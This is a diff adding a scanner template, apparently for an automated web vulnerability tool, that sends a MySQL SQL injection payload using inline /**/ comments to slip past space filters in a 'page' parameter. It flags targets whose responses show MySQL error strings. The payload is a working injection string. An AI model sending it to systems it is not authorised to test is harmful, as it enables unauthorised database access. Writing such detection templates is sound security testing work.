@@ -1,0 +1,23 @@
+id: patt-sqli-mysql-bypass-01-page
+name: 'PATT sqli patt-sqli-mysql-bypass-01 via page'
+severity: high
+type: active
+tags:
+  - sqli
+  - patt
+  - filterspace
+requires:
+  - php
+description: 'PATT MySQL space bypass with inline comment /**/. [patt:patt-sqli-mysql-bypass-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      page:
+        - '''/**/OR/**/1=1-- -'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
